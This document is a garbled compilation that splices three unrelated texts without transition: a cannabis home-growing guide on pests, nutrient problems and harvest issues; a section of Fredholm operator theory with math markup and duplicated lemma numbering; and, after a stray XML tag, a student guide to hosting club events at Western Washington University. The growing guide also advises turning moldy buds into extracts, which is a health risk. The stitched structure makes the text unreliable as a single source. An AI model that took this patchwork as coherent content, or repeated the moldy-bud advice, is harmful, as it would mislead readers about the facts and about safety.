As you continue growing, you will sooner or later face pests. Pests are able to destroy all of the plants in your garden if they are in same room. Pests will find your indoor environment to be ideal and full of food, without any natural enemies.

It is good to know what pests appear, where a crop they can live and what are the typical symptoms. All the symptoms are not due to pests and can be caused nutrient maladjusted nutrients.

A magnifying glass and daily or at least regular inspection can save your garden from ruin. Often, pests are hiding on the underside of leaves. In order to get an accurate view of pests and their effects on your plants a magnifier of at least 8x magnification power will be required. The most important thing is to monitor your plants regularly.

For other plants fighting pests is easier but hemp does not respond well to chemical pesticides and chemical poisons would often render the output to be unsafe to consume or smoke. Biological pesticides are not toxic, so they can be used to remove pests. Neem oil is a natural and effective insecticide, which is produced from Neem tree seeds by squeezing. Pine soap solution is another natural pesticide, which is active against some pests. Pesticides containing pyretine can be used safely (pyretrin is rapidly degradable organic insecticide). Before using any off the shelf pesticide you should make sure that the its use is recommended for fruits and vegetables. Any non-detergent soap can be mixed with water to make a natural pesticide, often ground red pepper or chilli powder is added as well to deter pests from returning. Soap based pesticides are effective against all soft bodied pests but because they kill on contact they must be applied with a great deal of care and do not on their own deter pests from returning. This is where the pepper additive comes in. If you have an aphid infestation then you should also consider taking steps to prevent ants from returning to your plants since it is the ants which farm the aphids.

===[[w:Tetranychus_urticae|Tetranychus urticae]]===

Spider mites are mostly orange-toned less than 0.5 mm long, spider animals. These should not occur if the humidity is above 80%. Vegetable mites are easy to identify because of their webs, but often it is already too late. If your hemp leaves are changing dirty yellow, and are starting to be falling, the plant may be infested with spider mites.

In order to prevent spider mites it is best to examine plants a few days apart with a magnifying glass. They cause damage in the form of small dots on the leaves, these dots are caused by the mites sucking of plant juices from the underside of the leaves. Begin by looking at leaf bottoms, usually, these very small spider animals thrive there. Eggs are spherical white dots. If mites are many and they are able to weave web, they can be very difficult to get rid of.

Spider mites thrive in a dry and warm environment, so the easiest of controlling is to increase air moisture. Mist regularly with water, especially below leafs. Keeping the temperature low will reduce their ability to reproduce. Unfortunately, spider mites remain alive even in cold temperatures and will resume activity when the temperature rises again.

If you find mites on any plant in your garden it may be best to remove it promptly to avoid infecting the other plants in the garden. Apply a safe insecticide (see information above on insecticides) thoroughly with careful attention to the undersides of leaves. Raise humidity above 80 percent and only then return the plant to the garden. Monitor the plant carefully for a few days. Often simply misting with water and raising the ambient humidity is sufficient.

Alternatively you can utilize predator mites Phytoseiulus persimili as a preventative measure. This will protect your crop through the vegetative phase of your grow only.

==Common Plant Problems==
The problems that plague growers are myriad so it is difficult to say what the best approach is to this topic. Perhaps the best approach is to make this guide practical for troubleshooting purposes. To this end. You should first find the part of the plant or type of plant material that is showing a symptom that makes you think there is a problem. From there, find the listed symptom that best describes what you are seeing and you will hopefully find the problem and suggested fixes. This section is intended for troubleshooting and diagnosis. If you would like to familiarize yourself with the symptoms of the most common problems then skim seed issues, root issues, ph and water related leaf symptoms, stem issues, and problems with harvested marijuana.

=== Seed ===
Seeds are the first step for a new generation of plants. A problem there, will result in poor performance throughout the grow. The ideal seed is a dark green, almost brown and may have stripes or other markings, it is plump and firm. A slight pressure on the seed will not crush it. These things can make the difference between a small spindly plant and a vigorous healthy plant. A plump particularly ripe seed within a batch indicates improved fast growing genetics and may signify a stronger seed, more likely to survive to maturity.

==== Brittle/White Seed ====
If a slight pressure with your fingertip crushes seeds the seeds are not viable. They are immature. You should move along to other seeds, if you produced these seeds you need to be sure to pollinate the plant early in flowering and to let the seeds grow until they are starting to fall out naturally and are fully ripe and mature.

==== Green Seed ====
A green seed is simply immature. If the seed is firm and doesn't crush easily under a fingertip then it might still be saved if you do not have a dark viable seed to replace it (only use less than ideal seed if you can't avoid it). In order to save a green seed place it inside a damp paper towel in a dark warm place and check every few hours. The color of the seed will darken as it first ripens and it may eventually sprout. You should plant this seed very close to the surface if it sprouts since it may not have the nutrient stores that a fully mature seed would have. With the appropriate attention and care a green seed can achieve a plant with the full potential of the genetics.

==== Small Seed ====
Always choose the largest seeds you can but many plants simply do not produce large seeds. Some strains produce small seed exclusively.

=== Roots ===
Root are... well the root of the plant. Water, nutrients, and hormone supplements will likely be passed up from the roots into the plant proper. You need a strong, healthy, and plentiful root system to be able to pass enough nutrients and to support the plant at its maximum growth rate. Since the root structure isn't usually visible in addition to listing symptoms it is worth pointing out what roots need so you won't have these problems in the first place.

==== Tight Packed Roots, Curling Around the Edge of Container ====
This symptom is often accompanied by less than optimum growth. Your roots simply don't have enough room. Give them some more space by transplanting to a larger container disturbing the root ball as little as possible. Many people massage the bottom and sides of the root ball very gently just enough to untangle the tips but not so much as to actually break the root ball. If when transplanting you see that the roots did not take advantage of the container's horizontal space it means you didn't transplant often enough early on. You should transplant from smaller to larger container. For example, one hempy grow the ideal transplant path involved starting the clone in a small rockwool cube. When root tips were visible this was transplanted to a 16oz plastic cup. After a couple weeks this was transplanted to a half filled 2.5gal hempy bucket. A few days before flowering this was transplanted for the last time by lifting out of the bucket and filling halfway and then setting the complete root ball on top of the new grow medium so the roots could fill the entire bucket.

==== Sparse or Insubstantial Roots ====
This depends on your stage of growth. But generally speaking roots will grow well in a medium with a carefully maintained PH and lots of oxygen. This can be an early sign that you need more oxygenation. Perhaps this is caused by poor drainage in the soil (water pulls air into the pot from the top as it drains down the bottom) or perhaps you should add an air stone to your reservoir in a hydroponic system. Note that oxygen and not air is needed, it is possible to grow with your roots submersed in well oxygenated water all the time.

==== Slimy, Smelly Roots ====
Lack of oxygen has caused a condition known as root rot in which your roots have begun to rot. You can try to save this plant but you should remember that the impact on upon the results of your grow are going to be substantial and you should mentally chock it up as a learning experience at this stage. This will be accompanied by symptoms in the plant vegetable material as well.

In order to try to save the plant you should remove the plant from its container and remove all traces of rotted material from the roots the smell is very strong and will be unmistakable. Rinse the roots thoroughly with clean water and let them dry out. Replace your medium with fresh sterile medium and disinfect your container or use a new one. When the roots are dry transplant to the clean medium and clean container. Most importantly, you need to solve whatever is causing the root rot. If you need an airstone or an additional airstone then add one, remix your soil/medium for better drainage, or make your flood and drain cycles less frequent.

=== Stems ===
Your stems are the trunks of your plant, or your leaf, or your flower. Each and every stem on the plant is important and is essential to the part it connects functioning correctly. People purchasing marijuana often complain about stems in ignorance. Stems contain within them a layer that transports nutrients and another soft pulp that transports water. Because of this stems are almost entirely composed of water weight and weight almost nothing when dried. For the best end result from your harvest, both in potency and quantity you will want nice strong thick stems.

==== Leaning Branches ====
If your branches are leaning down under the weight of your flowers the best thing you can do is tie up the branches. This can be partially avoided by installing a circulating fan in an indoor grow room to simulating the wind, the movement will cause your stems to strengthen.

==== Thin, Spindly Stalks ====
The most common cause of this symptom is lack of light. If plants are not getting enough light they will stretch to the light source so you probably need a bigger light and/or need to move it closer to the plants. Early on this can be partly solved by burying the plant more deeply when transplanting. Roots will eventually grow out of the newly submerged stem. You can also help with this condition by installing a circulating fan, the fan will simulate wind and the movement will strengthen stems. A weak root system may also contribute to this problem.

==== Broken Stem ====
This was probably caused by you trying to the bend the plant to your will (literally). Its okay, don't panic the plant will probably be fine. Just tape the stem back together and support it by tying to a stake if needed to take the pressure off the break while this heals. The plant will heal itself and will have a knot where the break was located. You should allow your plant time to recover before stressing the location. If the break is not completely severed just prop it up and you should not touch it for a week or so.

=== Leaves ===
It is through its leaves that a plant will absorb light from the sun, and utilize it in the [[w:photosynthesis|photosynthesis]] process, similar to a solar panel. In general terms leaves could be regarded as sensory organs, lungs and a secondary mouth. A plant's leaves are usually the first to show signs that something is wrong with it. With a few exceptions, damage to the leaf material will not recover after the problem is remedied, you should look to the new growth for signs that the problem is resolved and the overall condition of the plant should show improvement. You will not find an exhaustive list of nutrient deficiencies here only the most common and easily identified if you need advanced deficiency identification you should try asking experienced growers either in person or via the Internet, if posting via the Internet they will need pictures to diagnose the plant with any degree of accuracy.

A common mistake is to mistake a nutrient deficiency with a PH imbalance. A PH imbalance will cause your roots to be unable to take up nutrients and can even damage the roots. Anytime you see a possible nutrient imbalance such as yellowing, necrosis, or other signs of plant damage you should double check your PH before adjusting nutrients.

==== Drooping Leaves ====
The most common causes of this symptom are over and under watering.  If you are using a soil grow are you allowing the soil surface to get completely dry before watering again? You should be. If in a hydroponic grow you need to take measures to get oxygen to your roots. Otherwise, water your plant. You probably got scared by all the sites telling you over-watering is the most common beginner mistake (which is true). In a soil grow you will want to fully saturate the pot with water when you water and then let the top inch or two of the soil dry out before drowning her again. As an added note, if you are using soil and it never seems to dry out then you may have purchased a bag of topsoil and not potting soil. This soil will not drain at all. You need a proper soil mix.

==== Broad Leaves with Edges Curled Down ====
This is a sign of excessive humidity. This usually won't harm the plant but less than optimal conditions result in a less than optimal growth and harvest. The width of the leaf is also determined by genetics so broad leaves alone are not a sure indicator of whether your environment is too humid.

==== Narrow Leaves with Edges Curled Up ====
This is a sign of low humidity. Like excess humidity this will not harm the plant but less than optimal conditions result in a less than optimal growth. Genetics again affect leaf broadness as well.

==== Yellowing of the Leaves (from the bottom of the plant upward) ====
This can be a sign of nitrogen deficiency or of over fertilization. If accompanied early by browning and necrosis of the leaf tips then you may be over fertilizing. Adding extra fertilizer when you are already over-fertilizing will kill a plant at any stage of growth so it is safer to flush the plant (if using a pot use three times as much water as your container size) with clean water to remove the excess nutrients. If this helps then excess nutrients are the problem. This could be because you are feeding the plant too much or if later in the growth cycle could be caused by excess nutrient salts building up in the soil. If this does not help then you may need to add more N to your fertilizer mix. These symptoms can also be caused by a PH imbalance.

It is worth mentioning that this symptom will also be seen late in flowering on many strains and is perfectly natural as the plant draws in nutrients from the leaves toward the end of its life. Some growers prefer to give extra nitrogen to slow or prevent this and others like to let nature take its course. Either will produce fine output.

==== Brown/Purple Spots and/or Dark Green Leaves on Stunted Plant ====
This is generally a sign of phosphorus deficiency. You may need to add more phosphorus to your water or you might have a PH imbalance.

==== Brown/Tan/Pale Spots Throughout Leaves ====
You may have a phosphorus deficiency or you may have contracted a pest. Refer to the section on pests for more information on detecting and removing a pest infestation.

==== Yellowing Between Leaf Veins ====
This is likely a potassium deficiency. Add to your water or correct a PH balance. Potassium can also be locked out by salt buildup so if your PH is correct you may try a flush before adjusting nutrients.

==== Older Leaves Yellow From the Center Outward, Leaf tips brown progressing inward, pale new growth ====
Look to trace element deficiency for these problems. Magnesium and Calcium are likely culprits. You can add a bit of dolomite lime to your water (1 tsp/gallon) or add a supplement such as cal-mag, or cal-max, or similar. As always with nute deficiency your problem may actually be a PH imbalance.

==== Leaves Turn Pale Yellow or White with Green Veins ====
This is a sign of iron deficiency. Add more trace nutrients or chelated iron. As always, PH imbalance could also be the culprit.

=== Flowers (while on growing plant) ===
It goes without saying that flowers are what it is all about. They are the only part of the plant that contains high enough concentrations of psychoactive compounds to be used without additional processing after drying. Flowers are also critical to seed production.

==== White Pistils Turn Purple/Red/Orange ====
This is not a problem and means you have done something right. It is common for pistils to change color if they are not pollinated.

==== Flowers are Stunted with Hard Bumps between Pistils ====
Your plant is likely pollinated. The bumps are seeds.

==== Internode Spacing is Wide and Buds are airy ====
This is probably caused by a wide variation between your daytime and nighttime temperature. If using lights indoor you can do a number of things to keep temperature under control. The simplest adjustment is to make sure your lights run at night when it is coolest and are off during the day.

==== White Fluffy or Powdery Coating on Buds ====
Don't mistake this with the sparkling trichomes crystals that will coat the flowers and the surrounding leaves in a fairly uniform manner. This is either mold or it looks whispy and weblike may be a pest. Either way it must be removed from your garden. If a pest refer to pest section but if its powdery mold remove it from your garden immediately. Do NOT smoke or eat moldy bud you could get sick or even die. White powdery mildew is usually caused by too much humidity. On outdoor plants, a good spraying of the plant with a properly mixed neem oil solution will grossly inhibit mold growth. Indoors, the addition of a good quality dehumidifier will likely solve the problem.

==== Buds Are Small ====
The buds are the cumulation of the entire grow and their size will reflect literally everything else. For big buds you need healthy roots to deliver lots of nutrients. You need to deliver proper nutrient levels. You need to supplement CO2 during flowering and have proper ventilization when not supplementing. You need to control temperatures. And you need to prune your plants properly, removing smaller growth with little potential so that your plants may concentrate on the main bud or buds.

==== Buds Aren't Sticky/Resinous ====
The flowers simply aren't ready yet. Let them go a little longer. An early finishing strain will take a full eight weeks of flowering and some strains will take twelve weeks. Give your plants the time they need to mature.

=== Harvested Flowers ===
Many people mistakenly believe that they are done when they harvest their flowers but in many ways the challenge is only started. Now you have a big pile of potentially usable bud and must treat and tend it to completion with out problems.

==== Crispy Crumbly Buds ====
You simply let your bud dry too much and probably too fast.

==== Pliable Stems with Dry Bud ====
There is likely more moisture on the inside. You would depending on just how dry to the bud itself is you could move on to the curing stage using a slow cure draw the moisture out from the center of the plant or let it dry longer before curing.

==== Powdery or Whispy Tendrils in Flowers ====
This is mold/mildew. You need to let your buds get more air. Moldy buds can be post-processed into water hashes or other extracts (though generous freezing is required first)

==== Buds Smell and Taste Like Hay/Lawn ====
Characteristic of immature bud. This can often be partially solved with a long slow cure.

==== Buds Burn down to a Hard Black Ash ====
Too much phosphorus left in the plant during flowering. A slow dry and long cure will help. Next time do a proper flush before harvest.

==== Harsh Smoke ====
Possible over fertilizing.

Proper slow drying and curing will give a smooth smoke. Refer to the section covering this.

== Fredholm theory ==

We recall that the closed unit ball of a Banach space is compact if and only if the space is finite-dimensional. This is a special case of the next lemma:

'''7 Lemma''' ''Let &lt;math&gt;T: \mathcal{X} \to \mathcal{Y}&lt;/math&gt; be a closed densely defined operator. Then the following are equivalent.
*''(i) &lt;math&gt;\dim \operatorname{ker}(T) &lt; \infty&lt;/math&gt; and the range of ''T'' is closed.''
*''(ii) Every bounded sequence &lt;math&gt;f_j \in \mathcal{X}&lt;/math&gt; has a convergent subsequence when ''&lt;math&gt;T f_j&lt;/math&gt; is convergent.
Proof: We may assume ''T'' has dense range. (i) &lt;math&gt;\Rightarrow&lt;/math&gt; (ii): Suppose &lt;math&gt;f_j&lt;/math&gt; is a bounded sequence such that &lt;math&gt;T f_j&lt;/math&gt; is convergent. In view of the Hahn-Banach theorem, ''X'' is a direct sum of the kernel of &lt;math&gt;T&lt;/math&gt; and some other subspace, say, &lt;math&gt;\mathcal{W}&lt;/math&gt;. Thus, we can write:
:&lt;math&gt;f_j = g_j + h_j, (g_j \in \operatorname{ker}(T), h_j \in \mathcal{W})&lt;/math&gt;
By the closed graph theorem, the inverse of &lt;math&gt;T: \mathcal{W} \to \mathcal{Y}&lt;/math&gt; is continuous. Since &lt;math&gt;T f_j = T h_j&lt;/math&gt;, the continuity implies that &lt;math&gt;h_j&lt;/math&gt; is convergent. Since &lt;math&gt;g_j&lt;/math&gt; contains a convergent subsequence by the paragraph preceding the theorem, &lt;math&gt;f_j&lt;/math&gt; has a convergent subsequence then. (ii) &lt;math&gt;\Rightarrow&lt;/math&gt; (i): (ii) implies the first condition of (i), again by the preceding paragraph. For the second, suppose &lt;math&gt;T f_j&lt;/math&gt; is convergent. Then by (ii) &lt;math&gt;f_j&lt;/math&gt; has a subsequence &lt;math&gt;f_{j_k}&lt;/math&gt; converging to, say, &lt;math&gt;f&lt;/math&gt;. Since the graph of ''T'' is closed, &lt;math&gt;T f_{j_k}&lt;/math&gt; converges to &lt;math&gt;T f&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

A bounded linear operator &lt;math&gt;T: \mathfrak{H}_1 \to \mathfrak{H}_2&lt;/math&gt; between Hilbert spaces is said to be ''Fredholm'' if ''T'' and &lt;math&gt;T^*&lt;/math&gt; both satisfy the condition of (i) in the lemma. The definition is equivalent to requiring that the kernel of ''T'' and the quotient &lt;math&gt;\mathfrak{H}_2 / T(\mathfrak{H}_1)&lt;/math&gt; are finite-dimensional. In fact, if &lt;math&gt;\mathfrak{H}_2 / T(\mathfrak{H}_1)&lt;/math&gt; is finite-dimensional, then &lt;math&gt; T(\mathfrak{H}_1) &lt;/math&gt; is a complemented subspace; thus, closed. That &lt;math&gt;T&lt;/math&gt; has closed range implies that &lt;math&gt;T^*&lt;/math&gt; has closed range. For a Fredholm operator at least, it thus makes sense to define:
:&lt;math&gt;\operatorname{ind}(T) = \dim \operatorname{ker}(T) - \dim \operatorname{Coker}(T)&lt;/math&gt;.
Because of the first isomorphism theorem, the index is actually independent of any operator ''T'' when ''T'' is a map between finite-dimensional spaces. This is no longer the case for operators acting on infinite-dimensional spaces.

'''7 Lemma''' ''Let &lt;math&gt;T \in B(\mathfrak{H_1}, \mathfrak{H_2})&lt;/math&gt; and &lt;math&gt;S \in B(\mathfrak{H_2}, \mathfrak{H_3})&lt;/math&gt;. If &lt;math&gt;T&lt;/math&gt; and &lt;math&gt;S&lt;/math&gt; are Fredholm operators, then &lt;math&gt;ST&lt;/math&gt; is a Fredholm operator with
:&lt;math&gt;\operatorname{ind}(ST) = \operatorname{ind}(T) + \operatorname{ind}(S)&lt;/math&gt;.
Conversely, if &lt;math&gt;\mathfrak{H_3} = \mathfrak{H_1}&lt;/math&gt;, and both &lt;math&gt;TS&lt;/math&gt; and &lt;math&gt;ST&lt;/math&gt; are Fredholm operators, then &lt;math&gt;T&lt;/math&gt; is a Fredholm operator.''&lt;br /&gt;
Proof:
Since
:&lt;math&gt;\dim\operatorname{ker}(ST) \le \dim\operatorname{ker}(S) + \dim\operatorname{ker}(T)&lt;/math&gt;, and &lt;math&gt;\dim\operatorname{Coker}(ST) \le \dim\operatorname{Coker}(S) + \dim\operatorname{Coker}(T)&lt;/math&gt;,
we see that &lt;math&gt;ST&lt;/math&gt; is Fredholm. Next, using the identity
:&lt;math&gt;\dim X + \dim X^\bot \cap Y = \dim Y + \dim Y^\bot \cap X&lt;/math&gt;
we compute:
:&lt;math&gt;
\dim \operatorname{ker}(ST) = \dim \operatorname{ker}(S) \cap \operatorname{ran}(T) + \dim \operatorname{ker}(T) = \dim \operatorname{ker}(S) \cap \operatorname{ker}(T^*)^\bot + \dim \operatorname{ker}(T) &lt;/math&gt;
:&lt;math&gt;= - \dim \operatorname{ker}(T^*) + \dim \operatorname{ker}(S) + \dim \operatorname{ker}(S)^\bot \cap \operatorname{ker}(T^*) + \dim \operatorname{ker}(T) &lt;/math&gt;
:&lt;math&gt;= \operatorname{ind}(T) + \operatorname{ind}(S) + \dim \operatorname{ker}(T^* S^*).
&lt;/math&gt;
For the conversely, let &lt;math&gt;f_j&lt;/math&gt; be a bounded sequence such that &lt;math&gt;T f_j&lt;/math&gt; is convergent. Then &lt;math&gt;ST f_j&lt;/math&gt; is convergent and so &lt;math&gt;f_j&lt;/math&gt; has a convergent sequence when &lt;math&gt;ST&lt;/math&gt; is Fredholm. Thus, &lt;math&gt;\dim\operatorname{ker}T &lt; \infty&lt;/math&gt; and &lt;math&gt;T&lt;/math&gt; has closed range. That &lt;math&gt;TS&lt;/math&gt; is a Fredholm operator shows that this is also true for &lt;math&gt;T^*&lt;/math&gt; and we conclude that &lt;math&gt;T&lt;/math&gt; is Fredholm.
&lt;math&gt;\square&lt;/math&gt;

'''7 Theorem''' ''The mapping''
:&lt;math&gt;T \mapsto \operatorname{ind}(T)&lt;/math&gt;
''is a locally constant function on the set of Fredhold operators &lt;math&gt;T: \mathfrak{H}_1 \to \mathfrak{H}_2&lt;/math&gt;.''&lt;br /&gt;
Proof: By the Hahn-Banach theorem, we have decompositions:
:&lt;math&gt;\mathfrak{H}_1 = C_1 \oplus \operatorname{ker}(T), \quad \mathfrak{H}_2 = \operatorname{ran}(T) \oplus C_2&lt;/math&gt;.
With respect to these, we represent ''T'' by a block matrix:
:&lt;math&gt;T = \begin{bmatrix}
T' &amp; 0 \\
0 &amp; 0 \\
\end{bmatrix}&lt;/math&gt;
where &lt;math&gt;T': C_1 \to \operatorname{ran}T&lt;/math&gt;. By the above lemma, &lt;math&gt;\operatorname{ind}&lt;/math&gt; is invariant under row and column operations. Thus, for any &lt;math&gt;S = \begin{bmatrix}
S_1 &amp; S_2 \\
S_3 &amp; S_4 \\
\end{bmatrix}&lt;/math&gt;, we have:
:&lt;math&gt;\operatorname{ind}(T + S) = \operatorname{ind}(\begin{bmatrix}
T' + S_1 &amp; 0 \\
0 &amp; A \\
\end{bmatrix}) = \operatorname{ind}(A)&lt;/math&gt;,
since &lt;math&gt; T' + S_1&lt;/math&gt; is invertible when &lt;math&gt;\|S\|&lt;/math&gt; is small. ''A'' depends on ''S'' but the point is that &lt;math&gt;A&lt;/math&gt; is a linear operator between finite-dimensional spaces. Hence, the index of ''A'' is independent of ''A''; thus, of ''S''. &lt;math&gt;\square&lt;/math&gt;

'''7 Corollary''' ''If &lt;math&gt;T \in B(\mathfrak{H_1}, \mathfrak{H_2})&lt;/math&gt; is a Fredholm operator and ''K'' is a compact operator, then &lt;math&gt;T + K&lt;/math&gt; is a Fredholm operator with
:&lt;math&gt;\operatorname{ind}(T + K) = \operatorname{ind}(T)&lt;/math&gt;
Proof:
Let &lt;math&gt;f_j&lt;/math&gt; be a bounded sequence such that &lt;math&gt;(T+K)f_j&lt;/math&gt; is convergent. By compactness, &lt;math&gt;f_j&lt;/math&gt; has a convergent subsequence &lt;math&gt;f_{j_k}&lt;/math&gt; such that &lt;math&gt;Kf_{j_k}&lt;/math&gt; is convergent. &lt;math&gt;Tf_{j_k}&lt;/math&gt; is then convergent and so &lt;math&gt;f_{j_k}&lt;/math&gt; contains a convergent subsequence. Since &lt;math&gt;K^*&lt;/math&gt; is compact, the same argument applies to &lt;math&gt;T^*+K^*&lt;/math&gt;. The invariance of the index follows from the preceding theorem since &lt;math&gt;T+\lambda K&lt;/math&gt; is Fredholm for any complex number &lt;math&gt;\lambda&lt;/math&gt;, and the index of &lt;math&gt;T+\lambda K&lt;/math&gt; is constant. &lt;math&gt;\square&lt;/math&gt;

The next result, known as [[w:Fredholm alternative|Fredholm alternative]], is now easy but is very important in application.

'''7 Corollary''' ''If &lt;math&gt;K \in B(\mathfrak{H}_1, \mathfrak{H}_2)&lt;/math&gt; is a compact, then
:&lt;math&gt;\operatorname{ker}(K - \lambda I)&lt;/math&gt; and &lt;math&gt;\mathfrak{H}_2 / \operatorname{ran}(K - \lambda I)&lt;/math&gt;
have the same (finite) dimension for any nonzero complex number &lt;math&gt;\lambda&lt;/math&gt;, and &lt;math&gt;\sigma(K) \backslash \{0\}&lt;/math&gt; consists of eigenvalues of ''K''.&lt;br /&gt;
Proof: The first assertion follows from:
:&lt;math&gt;\operatorname{ind} (K - \lambda I) = \operatorname{ind} (I - \lambda^{-1} K) = 0&lt;/math&gt;,
and the second is the immediate consequence. &lt;math&gt;\square&lt;/math&gt;

'''7 Theorem''' ''Let &lt;math&gt;T \in B(\mathfrak{H_1}, \mathfrak{H_2})&lt;/math&gt;. Then &lt;math&gt;T&lt;/math&gt; is a Fredholm operator if and only if &lt;math&gt;I - TS&lt;/math&gt; and &lt;math&gt;I - ST&lt;/math&gt; are finite-rank operators for some &lt;math&gt;S \in B(\mathfrak{H_2}, \mathfrak{H_1})&lt;/math&gt;. Moreover, when &lt;math&gt;I - TS&lt;/math&gt; and &lt;math&gt;I - ST&lt;/math&gt; are of trace class (e.g., of finite-rank),
:&lt;math&gt;\operatorname{ind}(T) = \operatorname{Tr}(I - ST) - \operatorname{Tr}(I - TS)&lt;/math&gt;
Proof: Since the identities are Fredholm operators (in fact, any invertible operator) and since
:&lt;math&gt;ST = I_1 + (I_1 - ST)&lt;/math&gt;
:&lt;math&gt;TS = I_2 + (I_2 - TS)&lt;/math&gt;
&lt;math&gt;ST&lt;/math&gt; and &lt;math&gt;TS&lt;/math&gt; are Fredholm operators, which implies ''T'' is a Fredholm operator. Conversely, suppose ''T'' is a Fredholm operator. Then, as before, we can write:
:&lt;math&gt;T = \begin{bmatrix}
T' &amp; 0 \\
0 &amp; 0 \\
\end{bmatrix}&lt;/math&gt;
where &lt;math&gt;T'&lt;/math&gt; is invertible. If we set, for example, &lt;math&gt;S = \begin{bmatrix}
T'^{-1} &amp; 0 \\
0 &amp; 0 \\
\end{bmatrix}&lt;/math&gt;, then &lt;math&gt;S&lt;/math&gt; has required properties. Next, suppose ''S'' is given arbitrary: &lt;math&gt;S = \begin{bmatrix}
S_1 &amp; S_2 \\
S_3 &amp; S_4 \\
\end{bmatrix}&lt;/math&gt;. Then
:&lt;math&gt;\operatorname{Tr}(I - ST) = \operatorname{Tr}(1 - S_1 T') + \operatorname{dim}\operatorname{ker}T&lt;/math&gt;.
Similarly, we compute:
:&lt;math&gt;\operatorname{Tr}(I - TS) = \operatorname{Tr}(1 - T' S_1) + \operatorname{dim}\operatorname{Coker}T&lt;/math&gt;.
Now, since &lt;math&gt;T'(I - S_1 T') = (I - T' S_1) T'&lt;/math&gt;, and &lt;math&gt;T'&lt;/math&gt; is invertible, we have:
:&lt;math&gt;\operatorname{Tr}(I - S_1 T') = \operatorname{Tr}(I - T' S_1)&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

== Representations of compact groups ==

'''Theorem''' ''Every irreducible unitary representation of a compact group is finite-dimensional.''&lt;br /&gt;

      <text xml:space="preserve">This section is to list the solutions to the problems of hosting events including planning, finding a event place, and accounting for the number of people at the event.
{{TOC|limit=3}}
== Hosting Events == 

Most, but not all, clubs hold events supplementary to routine meetings.  Often used for recruiting purposes, events can include anything from group hikes, community service, and bike rides to movie-viewings, game nights, and barbecues.  Such affairs act as informal introductions to potential members, and as builders of community relationships.  The event planning process can take myriad forms due to the variety of club-sponsored events; however, it is often an arduous syncing of ideas, people, times, locations, and event promotions.  Following are sample steps for the coordination of, and the themes and motivations spurring club-sponsored events.

== Planning ==

Before an event can be put on there is the planning process. Before actions can be taken, a club must look at its budget. If a club doesn't have enough money to cover the fees the event would generate they may look for another club to help them pay for the event. This club would probably want to benefit from the event as well, its best if there is some synergy between the two or more clubs. If one club is going to be the main host, they could incorporate some additional activity that will benefit the other club helping with the funds. This is a great way to show that Western is more of a family community. (ex. the Ritmo Salsa Latino Dance club would like to put on an event but they don't have enough money to pay for the dance hall. They could get in contact with another performance club and split the cost. Ritmo Salsa club would contact the Tango club, and the Swing club. Each club would put up some cash toward the event)

Once a club has the funding to support an event, either from Associated Students or the clubs’ own fundraising, there is much more planning to go. The next step would be to choose a location. Whether you are hosting the event on campus or off campus you will need to seek permission from some supervisor. It can take a couple weeks so that’s why it’s important to secure a location before doing anything else. It is also good to know the site’s resources for the event, people capacity etc. The next step in planning an event is advertising. There are tons of different ways to do this and it is good to incorporate different outputs, such as posters and word of mouth in red square. The info fair held at the beginning of the year is one of the most effective ways of advertising for events (as long as they are planned out by that time and combines word of mouth, and posters in a way. A combination will be more effective than one or the other. Facebook has become increasingly popular as a method for publicity to the community as well. Try to get people to RSVP to the event so that you have an idea of how many people to expect and also it makes those who sent a RSVP or signed up to volunteer, accountable. Some events are more observatory and some are more participatory. It is good to plan back-up activities in case the event isn’t going as planned; something you can pull out in case of social disaster. Next we will look at planning an event in more depth and how clubs at Western Washington University have incorporated these methods. 

===Co-hosting Events===
Through the interviews with the Students for Slum Doctor Program I found that the initial attendance and organization of the event is the hardest. Once it takes off the ground however, it becomes much more inspiring.  Clubs who face low membership, funds and difficulties in rounding up attendees to events can co-host an event with another club supporting similar interests. This allows for more organizational help and the club allowances can be combined. It most importantly spreads the word in a very efficient manner. Allowing for more members allows for more possibility of the passing of information. It would be possible to hook up with  a larger community reaching club here on campus like KUGS at Western Washington University who could get fund raising event messages for clubs like Students for Slum Doctors on air for students to hear.

A) An efficient way of having a club host an event would be to have one person take on the responsibility of being in charge of the event. Although it could be stressful for that one person, it is the best route due to the fact that a miscommunication, forgotten necessity, or other mishap of having multiple people working on one thing, will be avoided. Although she is not the president, Stephanie is the founder of the WWU Weight Lifting Club. Stephanie also hosts and puts together fund raisers and takes care of the funding for events such as the WWU Strongman competition. Like the Cycling club, leadership in these clubs is crucial in making it run smoothly and host events well and in an organized fashion. This is mostly due to the fact that their officers are so active in their club by cycling in groups and participating in racing events.

Co-hosting events is a great way to bring new people into clubs. Similar to the way a collaboration with KUGS can benefit the Slum Doctors Club, a collaboration between the clubs that are based on performance can boost interest in the performance based clubs. Co-hosting an event such as a performance festival can provide the opportunity for all the performance based clubs such as the Dead Parrots Society, the Tango Club, and the A'cappella Club, to name a few, to showcase their talents in an event that would grab a larger audience because of the collaboration between the groups and because of the nature of the event as a larger event that involves many aspects of performance from the various groups involved. In these ways, co-hosting events can benefit organizations that might be lacking recruitment opportunities.

===Place of event===

There are many places on Western Washington University's campus that are good to host events. However, many clubs try to narrow it down to the most populated areas to attract attention. This is good for events such as fundraisers or for recruiting. The best place by far to recruit members is on red square, where students cross paths with many information booths. As far as fund raising, a popular place to host fundraisers would be on vendor's row if clubs are selling edible goods. The best places to host events on campus are probably the most convenient places for students such as red square, vendor's row and the Viking union. As far as hosting big events, Viking union offers many rooms that can be reserved for events.

A)The place where a club hosts an event can help and hurt the event. By holding the event in a public area where people who pass by can view the activities and become interested is a big part of deciding where to hold an event. The croquet club has done a very good job at placing their tournaments in plain sight where people can become interested and join in if they would like. For the most part the croquet club holds their tournaments in the front lawn of Old Main. By having their event places there they get many people who stop and ask questions and gain knowledge about the club and its cause, in turn gaining new members.

The AS productions group relies a lot on the availability of the places they host the events. The events that AS Productions put on can normally draw a lot of people depending upon the artist, movie, or other production taking place. Organization and being able to place the event in a place in which it can be easily attended. Not only does the place of the event matter but also the place in which the AS productions puts their advertisements, they want to put them in a place in which the most possible people will be able to see them. Many of AS Productions events require tickets that must be purchased before hand, unlike many other events such as the WWU Bodybuilding which can be placed right in the middle of red square and everybody, even passerby's, may attend. 

The Students Against Civilization held their meetings in a classroom in Fairhaven, and as a result there was no place to sit except the ground, which i'm sure discouraged many students from returning to the next meeting. The only activity available was to sit and discuss all the ways in which civilization sucks, with no ideas on what to do about it. That, I fear, was the greatest failure of the group. They lacked structure and organization, or even a well-formed idea of how to proceed. While the group received encouragement from those present at meetings, they never worked to make it what it could have been; an intelligent discussion of just what the next 50 years are going to be like here in America and innovative ideas of how to prepare yourself and your community.  

